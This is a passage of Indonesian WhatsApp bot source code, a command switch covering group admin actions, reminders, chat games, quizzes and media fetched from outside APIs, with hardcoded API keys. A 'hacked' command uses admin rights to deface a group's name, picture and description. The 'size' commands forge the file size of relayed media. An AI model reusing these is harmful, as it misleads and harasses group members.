            if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return sticNotAdmin(from)
        if (!isGroup) return;
        ronove.revokeInvite(from);
        reply("```Succes revoke link group```");
        break;
      case "opengc":
            if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return sticNotAdmin(from)
        if (!isGroup) return;
        reply(`*SUCCES OPEN GROUP*`);
        ronove.groupSettingChange(from, GroupSettingChange.messageSend, false);
        break;
      case "reminder": // by Slavyan
      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        if (!q)
          return reply(
            `CONTOH PENGGUNANNYA:\n${prefix}reminder text/2s\n\nNOTE: \n*s* - seconds\n*m* - minutes\n*h* - hours\n*d* - days`
          );
        teks = body.slice(10);
        const messRemind = teks.split("/")[0];
        const timeRemind = teks.split("/")[1];
        typeRemind = "Text";
        if (isQuotedImage) typeRemind = "Image";
        if (isQuotedSticker) typeRemind = "Sticker";
        if (isQuotedAudio) typeRemind = "Audio";
        if (!isQuotedImage && !isQuotedAudio && !isQuotedSticker)
          typeRemind = "Text";
        const parsedTime = ms(toMs(timeRemind));
        reminder.addReminder(
          sender,
          messRemind,
          typeRemind,
          timeRemind,
          _reminder
        );
        if (!isQuotedImage && !isQuotedSticker && !isQuotedAudio) {
          await ronove.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Text
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              ronove.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedSticker) {
          encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
            .message.extendedTextMessage.contextInfo;
          media = await ronove.downloadAndSaveMediaMessage(encmedia);
          await ronove.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Sticker
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              ronove.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              ronove.sendMessage(from, fs.readFileSync(media), sticker);
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedImage) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          media = await ronove.downloadAndSaveMediaMessage(encmedia);
          await ronove.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Image
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              teks = `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`;
              ronove.sendMessage(from, media, image, {
                contextInfo: { mentionedJid: [sender] },
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedAudio) {
          encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
            .message.extendedTextMessage.contextInfo;
          media = await ronove.downloadAndSaveMediaMessage(encmedia);
          await ronove.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Audio
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              ronove.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              ronove.sendMessage(from, fs.readFileSync(media), audio, {
                contextInfo: { mentionedJid: [sender] },
                mimetype: "audio/mp4",
                ptt: true,
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        }
        break;
case 'hacked':
      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
  if (!mek.key.fromMe) return;
              if (!isGroup) return reply(mess.only.group)
              if (args.length < 1) return reply('Teksnya?')
              reply('Otw Hack')
                tessgc = await getBuffer(`https://i.ibb.co/m4Qx3JG/20210319-204838.jpg`)
                   ronove.updateProfilePicture (from, tessgc)
                   await sleep(1000)
                ronove.groupUpdateSubject(from, `HACKED BY ${body.slice(8)}`)
                await sleep(1000)
                ronove.groupUpdateDescription(from, `_${pushname} telah meretas grup ini_`)             
                await sleep(1000)
                ronove.sendMessage(from, 'Succes Hacked', text, {quoted: fyt})
case 'mygithub':
      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
  reply('https://github.com/didinxc')
					break;
        case 'suit':
              if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
   try {
     const text = args.join(' ')
     if (!text) return reply(`Pilihan yang tersedia\n\ngunting, kertas, batu\n\n${prefix}suit gunting\n\nkasih spasi!`)
     var m4ni1kku = Math.random()
     if (m4ni1kku < 0.34) {
       m4ni1kku = 'batu'
     } else if (m4ni1kku > 0.34 && m4ni1kku < 0.67) {
       m4ni1kku = 'gunting'
     } else {
       m4ni1kku = 'kertas'
     }
     if (text == m4ni1kku) {
       reply(`❒「  *SUIT GAME*  」\n${gaya}Hasil Seri!\nkamu: ${text}\nBot: ${m4ni1kku}${gaya}\n*Gambare*`)
     } else if (text == 'batu') {
       if (m4ni1kku == 'gunting') {
         // uang.addDuit(sender)
         reply(`❒「  *SUIT GAME*  」\nKamu menang! Kamu Mendapat Balance Sebesar Rp.1000\nKamu: ${text}\nBot: ${m4ni1kku}`)
       } else {
         reply(`❒「  *SUIT GAME*  」\nKamu kalah!\nkamu: ${text}\nBot: ${m4ni1kku}`)
       }
     } else if (text == 'gunting') {
       if (m4ni1kku == 'kertas') {
         //uang.addDuit(sender)
         reply(`❒「  *SUIT GAME*  」\nKamu menang! Kamu Mendapat Balance Sebesar Rp.1000\nKamu: ${text}\nBot: ${m4ni1kku}`)
       } else {
         reply(`❒「  *SUIT GAME*  」\nKamu kalah!\nkamu: ${text}\nBot: ${m4ni1kku}`)
       }
     } else if (text == 'kertas') {
       if (m4ni1kku == 'batu') {
         //uang.addDuit(sender)
         reply(`❒「  *SUIT GAME*  」\nKamu menang! Kamu Mendapat Balance Sebesar Rp.1000\nKamu: ${text}\nBot: ${m4ni1kku}`)
       } else {
         reply(`❒「  *SUIT GAME*  」\nKamu kalah!\nkamu: ${text}\nBot: ${m4ni1kku}`)
       }
     } else {
       reply('*Kayak Anak Tk Aja Anak Tk Aja Tau Gunting Batu Kertas*')
     }
   } catch {
     reply('*Error*')
   }
   break
        case 'tts':
      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        sticWait(from)

					 if (args.length == 0) return reply(`Example: ${prefix + command} id|hai`)

					query = args.join(" ").split("|")

					

					tts = await getBuffer(`http://hadi-api.herokuapp.com/api/tts?language=${query[0]}&text=${query[1]}`)

                    ronove.sendMessage(from, tts, audio, { mimetype: 'audio/mp4', duration: 359996400, ptt:true})

					break
        case 'slot':
              if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
            const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
            const somtoy2 = sotoy1[Math.floor(Math.random() * sotoy1.length)]
            const somtoy3 = sotoy2[Math.floor(Math.random() * sotoy2.length)]
            const somtoy4 = sotoy3[Math.floor(Math.random() * sotoy3.length)]
            ronove.sendMessage(from, `
[ SLOTS ]\n-----------------
${somtoy2}
${somtoy}<=====
${somtoy3}
[ SLOTS ]
Keterangan : Jika anda Mendapatkan 3Buah Sama Berarti Kamu Win
Contoh : ${somtoy4}<=====`, text, { quoted: mek })
            break
        				    case 'tembak':
              if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
                    if (args[0] == 'udara') {
                    setTimeout( () => {
                    reply(`[ *PERINTAH DILAKSANAKAN* ]`)
                    }, 1000)
                    setTimeout( () => {
                    reply(`[ *SEDANG BERBURU* ]`)
                    }, 5000)
                    setTimeout( () => {
                    reply(`[ *SUKSES !! DAN ANDA MENDAPATKAN* ]`)
                    }, 8000)
                    setTimeout( () => {
                    reply(`[ *WOW ANDA MENDAPATKAN* ]\n[ *${buruh33}* ]`)
                    }, 12000)
                    }
                    if (args[0] == 'darat') {
                    setTimeout( () => {
                    reply(`[ *PERINTAH DILAKSANAKAN* ]`)
                    }, 1000)
                    setTimeout( () => {
                    reply(`[ *SEDANG BERBURU* ]`)
                    }, 5000)
                    setTimeout( () => {
                    reply(`[ *SUKSES !! DAN ANDA MENDAPATKAN* ]`)
                    }, 8000)
                    setTimeout( () => {
                    reply(`[ *WOW ANDA MENDAPATKAN* ]\n[ *${buruh22}* ]`)
                    }, 12000)
                    }
                    if (args[0] == 'laut') {
                    setTimeout( () => {
                    reply(`[ *PERINTAH DILAKSANAKAN* ]`)
                    }, 1000)
                    setTimeout( () => {
                    reply(`[ *SEDANG BERBURU* ]`)
                    }, 5000)
                    setTimeout( () => {
                    reply(`[ *SUKSES !! DAN ANDA MENDAPATKAN* ]`)
                    }, 8000)
                    setTimeout( () => {
                    reply(`[ *WOW ANDA MENDAPATKAN* ]\n[ *${buruh11}* ]`)
                    }, 12000)
                    }
                    break
        case 'truth':
              if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
                const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
		const ttrth = trut[Math.floor(Math.random() * trut.length)]
		truteh = await getBuffer(`https://i.ibb.co/0yLmMkB/20210329-102215.jpg`)
		ronove.sendMessage(from, truteh, image, { caption: '*TRUTH*\n\n'+ ttrth, quoted: fgif })
		break
        		case 'dare':
              if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
		const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "ðŸ¦„??" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " gw wibu sejati " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
		const der = dare[Math.floor(Math.random() * dare.length)]
		teff = await getBuffer(`https://i.ibb.co/BypfSsH/20210329-103035.jpg`)
		ronove.sendMessage(from, teff, image, { quoted: ftrol, caption: '*DARE*\n\n'+ der })
		break
        case 'caklontong':
              if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
					anu = await fetchJson(`https://velgrynd.herokuapp.com/api/caklontong`, {method: 'get'})
					get = `*${anu.result.soal}*`
					setTimeout( () => {
					ronove.sendMessage(from, 'Jawaban: '
                                          +anu.result.jawaban, text, {quoted: fgif}) // ur cods
					}, 60000) // 1000 = 1s,
                                        setTimeout( () => {
					ronove.sendMessage(from, '_10 Detik lagi..._', text) // ur cods
					}, 50000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_20 Detik lagi..._', text) // ur cods
					}, 40000) // 1000 = 1s,
                                        setTimeout( () => {
					ronove.sendMessage(from, '_30 Detik lagi..._', text) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_40 Detik lagi..._', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_50 Detik lagi..._', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_60 Detik lagi..._', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, get, text, {quoted: fgif}) // ur cods
					}, 0) // 1000 = 1s,
					break
case 'tebakkalimat':
					anu = await fetchJson(`https://velgrynd.herokuapp.com/api/tebak/kalimat`, {method: 'get'})
					get = `*${anu.result.soal}*`
					setTimeout( () => {
					ronove.sendMessage(from, 'Jawaban: '
                                          +anu.result.jawaban, text, {quoted: fgif}) // ur cods
					}, 60000) // 1000 = 1s,
                                        setTimeout( () => {
					ronove.sendMessage(from, '_10 Detik lagi..._', text) // ur cods
					}, 50000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_20 Detik lagi..._', text) // ur cods
					}, 40000) // 1000 = 1s,
                                        setTimeout( () => {
					ronove.sendMessage(from, '_30 Detik lagi..._', text) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_40 Detik lagi..._', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_50 Detik lagi..._', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_60 Detik lagi..._', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, get, text, {quoted: fgif}) // ur cods
					}, 0) // 1000 = 1s,
					break
        case 'tebaktebakan':
					anu = await fetchJson(`https://velgrynd.herokuapp.com/api/tebak/tebakan`, {method: 'get'})
					get = `*${anu.result.soal}*`
					setTimeout( () => {
					ronove.sendMessage(from, 'Jawaban: '
                                          +anu.result.jawaban, text, {quoted: fgif}) // ur cods
					}, 60000) // 1000 = 1s,
                                        setTimeout( () => {
					ronove.sendMessage(from, '_10 Detik lagi..._', text) // ur cods
					}, 50000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_20 Detik lagi..._', text) // ur cods
					}, 40000) // 1000 = 1s,
                                        setTimeout( () => {
					ronove.sendMessage(from, '_30 Detik lagi..._', text) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_40 Detik lagi..._', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_50 Detik lagi..._', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_60 Detik lagi..._', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, get, text, {quoted: fgif}) // ur cods
					}, 0) // 1000 = 1s,
					break
case 'tebaklirik':
					anu = await fetchJson(`https://velgrynd.herokuapp.com/api/tebak/lirik`, {method: 'get'})
					get = `*${anu.result.question}*`
					setTimeout( () => {
					ronove.sendMessage(from, 'Jawaban: '
                                          +anu.result.answer, text, {quoted: fgif}) // ur cods
					}, 60000) // 1000 = 1s,
                                        setTimeout( () => {
					ronove.sendMessage(from, '_10 Detik lagi..._', text) // ur cods
					}, 50000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_20 Detik lagi..._', text) // ur cods
					}, 40000) // 1000 = 1s,
                                        setTimeout( () => {
					ronove.sendMessage(from, '_30 Detik lagi..._', text) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_40 Detik lagi..._', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_50 Detik lagi..._', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_60 Detik lagi..._', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, get, text, {quoted: fgif}) // ur cods
					}, 0) // 1000 = 1s,
					break
case 'tebakkimia':
					anu = await fetchJson(`https://velgrynd.herokuapp.com/api/tebak/kimia`, {method: 'get'})
					get = `*${anu.result.nama}*`
					setTimeout( () => {
					ronove.sendMessage(from, 'Jawaban: '
                                          +anu.result.lambang, text, {quoted: fgif}) // ur cods
					}, 60000) // 1000 = 1s,
                                        setTimeout( () => {
					ronove.sendMessage(from, '_10 Detik lagi..._', text) // ur cods
					}, 50000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_20 Detik lagi..._', text) // ur cods
					}, 40000) // 1000 = 1s,
                                        setTimeout( () => {
					ronove.sendMessage(from, '_30 Detik lagi..._', text) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_40 Detik lagi..._', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_50 Detik lagi..._', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_60 Detik lagi..._', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, get, text, {quoted: fgif}) // ur cods
					}, 0) // 1000 = 1s,
					break
case 'tebakjenaka':
					anu = await fetchJson(`https://velgrynd.herokuapp.com/api/tebak/jenaka`, {method: 'get'})
					tebakjenaka = `*${anu.result.pertanyaan}*`
					setTimeout( () => {
					ronove.sendMessage(from, 'Jawaban: '
                                          +anu.result.jawaban, text, {quoted: fgif}) // ur cods
					}, 60000) // 1000 = 1s,
                                        setTimeout( () => {
					ronove.sendMessage(from, '_10 Detik lagi..._', text) // ur cods
					}, 50000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_20 Detik lagi..._', text) // ur cods
					}, 40000) // 1000 = 1s,
                                        setTimeout( () => {
					ronove.sendMessage(from, '_30 Detik lagi..._', text) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_40 Detik lagi..._', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_50 Detik lagi..._', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_60 Detik lagi..._', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, tebakjenaka, text, {quoted: fgif}) // ur cods
					}, 0) // 1000 = 1s,
					break
				case 'family100':
					anu = await fetchJson(`https://velgrynd.herokuapp.com/api/family100`, {method: 'get'})
					family = `*${anu.result.soal}*`
					setTimeout( () => {
					ronove.sendMessage(from, 'Jawaban: '
                                          +anu.result.jawaban, text, {quoted: fgif}) // ur cods
					}, 60000) // 1000 = 1s,
                                        setTimeout( () => {
					ronove.sendMessage(from, '_10 Detik lagi..._', text) // ur cods
					}, 50000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_20 Detik lagi..._', text) // ur cods
					}, 40000) // 1000 = 1s,
                                        setTimeout( () => {
					ronove.sendMessage(from, '_30 Detik lagi..._', text) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_40 Detik lagi..._', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_50 Detik lagi..._', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_60 Detik lagi..._', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, family, text, {quoted: fgif}) // ur cods
					}, 0) // 1000 = 1s,
					break
        				    case 'tebakgambar':
					anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/tebakgambar?apikey=Ikyy69`, {method: 'get'})
					ngebuff = await getBuffer(anu.img)
					tebak = `Jawaban : *${anu.jawaban}*`
					setTimeout( () => {
					ronove.sendMessage(from, tebak, text, {quoted: mek})
					}, 60000) // 1000 = 1s,
        			setTimeout( () => {
					ronove.sendMessage(from, '_10 Detik lagi..._', text) // ur cods
					}, 50000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_20 Detik lagi..._', text) // ur cods
					}, 40000) // 1000 = 1s,
                    setTimeout( () => {
					ronove.sendMessage(from, '_30 Detik lagi..._', text) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_40 Detik lagi..._', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_50 Detik lagi..._', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_60 Detik lagi..._', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, ngebuff, image, { caption: '_Tebak bro!!! gak bisa jawab donasi ya:v_', quoted: mek }) // ur cods
					}, 0) // 1000 = 1s,
					break
   case 'pokemon':
         if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
      sticWait(from)
					sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/pokemon?apikey=Ikyy69`, `Ni Kak Lucu Kan :]`)
					break
         case 'ss':
               if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
      sticWait(from)
					sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/ssweb?url=${args[0]}&apikey=${HunterApi}`, `Ni Kak`)
					break
case 'harta':
      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
  sticWait(from)
  sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/chartatahta?text=${args[0]}&apikey=${HunterApi}`, `Ni 🗿`)
  break
 case '+62':
       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
sticWait(from)
sendMediaURL(from,`https://itsmevall.herokuapp.com/api/asupan?apikey=${valkey}`, `Ni Kak`)
 break
case 'santuy':
case 'ghea':
case 'ukty':
case 'bocil':
case 'rikagusriani':
sticWait(from)
     ini_result = await fetchJson(`https://ronove-bot-api.herokuapp.com/api/asupan/${command}?apikey=Alphabot`)
     get_result = ini_result.result
        ini_vid = await getBuffer(get_result.url)
     ronove.sendMessage(from, ini_vid, video, {mimetype: 'video/mp4',quoted:mek})
     break
                case 'mangadl':
                      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        if (args.length < 1) return reply(`Example : ${prefix + command} naruto`)
     ini_result = await fetchJson(`https://ronove-bot-api.herokuapp.com/api/manga?search=${args[0]}&apikey=Alphabot`,{method:'get'})
     get_result =  `Title: ${ini_result.result.title}
     note : ${ini_result.result.note}
     description : ${ini_result.result.description}`
     reply (get_result)
     break
case 'hartatahta':
case 'tahta':
if (!q) return reply(`NAMANYA SIAPA ADUH`)
sticWait(from)
anonee = await getBuffer(`https://api.xteam.xyz/tahta?text=${q}&APIKEY=${xteamkey}`)
ronove.sendMessage(from, anonee, image, {quoted:nikak})
break
         case 'infotsunami':
               if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
     ini_result = await fetchJson('https://ronove-bot-api.herokuapp.com/api/infogempa?apikey=Alphabot')
     get_result = ini_result.result
        ini_txt = `INFO TSUNAMI TERKINI

`
        ini_txt += `tangal : ${get_result.tangal}\n`
        ini_txt += `lokasi : ${get_result.lokasi}\n`
        ini_txt += `magnitude : ${get_result.magnitude}\n`
        ini_txt += `kedalaman : ${get_result.kedalaman}\n`
        ini_txt += `wilayah : ${get_result.wilayah}`
     reply (ini_txt)
     break
        case 'infogempa':
              if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
     ini_result = await fetchJson('https://ronove-bot-api.herokuapp.com/api/infogempa?apikey=Alphabot')
     get_result = ini_result.result
        ini_txt = `INFO GEMPA TERKINI

`
        ini_txt += `Waktu : ${get_result.Waktu}\n`
        ini_txt += `Lintang : ${get_result.Lintang}\n`
        ini_txt += `Bujur : ${get_result.Bujur}\n`
        ini_txt += `Magnitudo : ${get_result.Magnitudo}\n`
        ini_txt += `Kedalaman : ${get_result.Kedalaman}\n`
        ini_txt += `Wilayah : ${get_result.Wilayah}`
     reply (ini_txt)
     break
case 'size':
      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (args.length < 1) return reply('Masukan angkanya')
filsize = args[0]
costick = await ronove.prepareMessageFromContent(from,{
"stickerMessage": {
"url": m.quoted.url,
"fileSha256": m.quoted.fileSha256.toString('base64'),
"fileEncSha256": m.quoted.fileEncSha256.toString('base64'),
"mediaKey": m.quoted.mediaKey.toString('base64'),
"mimetype": m.quoted.mimetype,
"height": m.quoted.height,
"width": m.quoted.width,
"directPath": m.quoted.directPath,
"fileLength": filsize,
"mediaKeyTimestamp": m.quoted.mediaKeyTimestamp.low,
"isAnimated": m.quoted.isAnimated
}
}, {quoted:fgif})
ronove.relayWAMessage(costick)
break

case 'sizeimg':
      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (args.length < 1) return reply('Masukan angkanya')
filsizei = args[0]
costick3 = await ronove.prepareMessageFromContent(from,{
"imageMessage": {
	"url": m.quoted.url,
	"mimetype": m.quoted.mimetype,
	"caption": m.quoted.caption,
	"fileSha256": m.quoted.fileSha256.toString('base64'),
	"fileLength": filsizei,
	"height": m.quoted.height,
	"width": m.quoted.width,
	"mediaKey": m.quoted.mediaKey.low,
	"jpegThumbnail": m.quoted.jpegThumbnail
}
}, {quoted:ftroli})
ronove.relayWAMessage(costick3)
break
      case "jadibotw":
        jadibot(reply, ronove, from);
        break;
      case "stopjadibot":
        stopjadibot(reply);
        break;
      case "listbot":
        let tekss = "「 *LIST JADIBOT* 」\n";
        for (let i of listjadibot) {
          tekss += `*Nomor* : ${i.jid.split("@")[0]}
*Nama* : ${i.name}
*Device* : ${i.phone.device_manufacturer}
*Model* : ${i.phone.device_model}\n\n`;
        }
